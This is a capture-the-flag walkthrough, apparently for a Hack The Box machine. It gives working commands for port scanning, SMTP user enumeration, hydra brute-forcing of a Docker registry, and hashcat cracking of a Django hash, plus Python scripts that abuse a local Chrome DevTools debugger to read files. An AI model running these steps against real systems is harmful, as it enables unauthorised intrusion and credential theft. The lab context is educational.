## Initial information collection

First use nmap to scan.

```
nmap -sS -p- 10.10.11.9
```

You can get the open ports: 22, 25, 80, 1337, 5000.

Further scan the port fingerprint to view the port service and its version.

```
nmap -sV -p 22,25,80,1337,5000 10.10.11.9
```

The results obtained:

```
$ sudo nmap -sV -p 22,25,80,1337,5000 10.10.11.9
Starting Nmap 7.94 ( https://nmap.org ) at 2024-05-21 11:40 CST
Nmap scan report for *.magicgardens.htb (10.10.11.9)
Host is up (0.25s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
25/tcp   open  smtp     Postfix smtpd
80/tcp   open  http     nginx 1.22.1
1337/tcp open  waste?
5000/tcp open  ssl/http Docker Registry (API: 2.0)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port1337-TCP:V=7.94%I=7%D=5/21%Time=664C17CA%P=x86_64-pc-linux-gnu%r(Ge
SF:nericLines,15,"\[x\]\x20Handshake\x20error\n\0")%r(GetRequest,15,"\[x\]
SF:\x20Handshake\x20error\n\0")%r(HTTPOptions,15,"\[x\]\x20Handshake\x20er
SF:ror\n\0")%r(RTSPRequest,15,"\[x\]\x20Handshake\x20error\n\0")%r(RPCChec
SF:k,15,"\[x\]\x20Handshake\x20error\n\0")%r(DNSVersionBindReqTCP,15,"\[x\
SF:]\x20Handshake\x20error\n\0")%r(DNSStatusRequestTCP,15,"\[x\]\x20Handsh
SF:ake\x20error\n\0")%r(Help,15,"\[x\]\x20Handshake\x20error\n\0")%r(Termi
SF:nalServerCookie,15,"\[x\]\x20Handshake\x20error\n\0")%r(X11Probe,15,"\[
SF:x\]\x20Handshake\x20error\n\0")%r(FourOhFourRequest,15,"\[x\]\x20Handsh
SF:ake\x20error\n\0")%r(LPDString,15,"\[x\]\x20Handshake\x20error\n\0")%r(
SF:LDAPSearchReq,15,"\[x\]\x20Handshake\x20error\n\0")%r(LDAPBindReq,15,"\
SF:[x\]\x20Handshake\x20error\n\0")%r(LANDesk-RC,15,"\[x\]\x20Handshake\x2
SF:0error\n\0")%r(TerminalServer,15,"\[x\]\x20Handshake\x20error\n\0")%r(N
SF:CP,15,"\[x\]\x20Handshake\x20error\n\0")%r(NotesRPC,15,"\[x\]\x20Handsh
SF:ake\x20error\n\0")%r(JavaRMI,15,"\[x\]\x20Handshake\x20error\n\0")%r(ms
SF:-sql-s,15,"\[x\]\x20Handshake\x20error\n\0")%r(afp,15,"\[x\]\x20Handsha
SF:ke\x20error\n\0")%r(giop,15,"\[x\]\x20Handshake\x20error\n\0");
Service Info: Host:  magicgardens.magicgardens.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.92 seconds
```

Service information is obtained, where port 1337 is unknown, probably a service written by myself.
![[Pasted image 20240524132831.png]]
![[Pasted image 20240524132904.png]]
![[Pasted image 20240524135451.png]]
![[Pasted image 20240524135517.png]]


## Exploit SMTP service to obtain username

Collect username information for the SMTP service. Here we use smtp-user-enum. If Kali does not have it, you can download it directly using apt.

```
sudo smtp-user-enum -M VRFY -U /usr/share/wordlists/user/username.txt -t 10.10.11.9
```

The dictionary here is found on github https://github.com/rootphantomer/Blasting_dictionary/blob/master/%E5%B8%B8%E7%94%A8%E7%94%A8%E6%88%B7%E5%90%8D.txt



![[Pasted image 20240524135756.png]]

## Blasting the docker registry service to obtain the private warehouse password

Here we use hydra for blasting. Hydra itself does not have a direct docker module. Here we use https-get

```
hydra -l alex -p /usr/share/wordlists/rockyou.txt 10.10.11.9 -s 5000 https-get /v2/
```

result:

![[Pasted image 20240524134251.png]]

Get password:`diamonds`

I could only open the docker registry after trying.

## Collect private warehouse information

https://book.hacktricks.xyz/v/cn/network-services-pentesting/5000-pentesting-docker-registry

Use a browser to `https://10.10.11.9:5000/v2/_catalog`access the mirror list of a private repository.

![image](https://image.3001.net/images/20240521/1716268989_664c2fbd64c6842696d8d.png!small)

It can be seen that there is a mirror named `magicgardens,htb`, which has the same name as the port 80 service and should be the corresponding mirror of the 80 service.

Visit `https://10.10.11.9:5000/v2/magicgardens.htb/tags/list`, get the image tag

![image](https://image.3001.net/images/20240521/1716269000_664c2fc8b6b5ee7af8922.png!small)

It can be seen that there is only one label`1.3`

## Pull the image, run the container, and get the password hash

Log `docker login 10.10.11.9:5000 -u alex -p diamonds`in to the private warehouse

![[Pasted image 20240524133744.png]]


When `docker pull 10.10.11.9:5000/magicgardens.htb:1.3`pulling images, you need to wait for a while because the image has been pulled and there is no process here.

![[Pasted image 20240524134102.png]]

Use `docker run -p 8888:80 -itd 10.10.11.9:5000/magicgardens.htb:1.3`Run Container.

Then use `docker ps`to view the container id
![[Pasted image 20240524134641.png]]

Use to `docker exec -it <container:id> bash`enter the container.

![[Pasted image 20240524134711.png]]

It can be confirmed that it is indeed the port 80 service, which also contains the sqlite3 database.

We exit the container, or open a new terminal, and use `docker cp d70e:/usr/src/app ./`to copy the web service files to the host. (Replace d70e with your own container id)

![[Pasted image 20240524134742.png]]
![[Pasted image 20240524134801.png]]
Check the db.sqlite3 file and find the hash value.

![[Pasted image 20240524134827.png]]

## hashcat cracks hash values

Here the hash type is `Django (PBKDF2-SHA256)`checked and the number is 10000.

```
hashcat -a 0 -m 10000 .\hashfile\week5-2.txt .\wordlist\rockyou.txt
```

![image](https://image.3001.net/images/20240521/1716269062_664c300675becddc994c6.png!small)

Get the password of user morty as jonasbrothers.

## SSH login, a new round of information collection

Log in as morty:jonasbrothers and enter the host terminal.

Use `ps aux`Get to run the terminal, and use `netstat -nulte`Get to run the service port.

![[Pasted image 20240524132615.png]]

![[Pasted image 20240524132439.png]]
![[Pasted image 20240524132456.png]]



![[Pasted image 20240524135206.png]]
![[Pasted image 20240524135329.png]]
![[Pasted image 20240524131859.png]]
use chatgpt to writecode
root.png
```
import websocket
import json
import base64
# Extract the WebSocket debugger URL from the list
web_socket_debugger_url = "ws://127.0.0.1:33845/devtools/page/23d64460-094e-4cad-9733-5f1d26d1b83a"

# Establish a WebSocket connection
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)

# Send a command to the debugger
command = json.dumps({"id": 1, "method": "Page.captureScreenshot", "params": {"format": "png"}})
ws.send(command)

# Receive the response
response = json.loads(ws.recv())

# Check if the result contains the screenshot data
if 'result' in response and 'data' in response['result']:
    print("Success file reading")
    with open("root.png", "wb") as file:
        file.write(base64.b64decode(response['result']['data']))
else:
    print("Error file reading")
    print(f"Response: {response}")

# Close the WebSocket connection
ws.close()
                
```
user.png
```
import websocket
import json
import base64

# Extract the WebSocket debugger URL from the list
web_socket_debugger_url = "ws://127.0.0.1:33845/devtools/page/d431f338-a2eb-4b6b-a68e-f6bd2c2fcc4b"

# Establish a WebSocket connection
ws = websocket.create_connection(web_socket_debugger_url, suppress_origin=True)

# Send a command to the debugger
command = json.dumps({"id": 1, "method": "Page.captureScreenshot", "params": {"format": "png"}})
ws.send(command)

# Receive the response
response = json.loads(ws.recv())

# Check if the result contains the screenshot data
if 'result' in response and 'data' in response['result']:
    print("Success file reading")
    with open("user.png", "wb") as file:
        file.write(base64.b64decode(response['result']['data']))
else:
    print("Error file reading")
    print(f"Response: {response}")

# Close the WebSocket connection
ws.close()
                      
```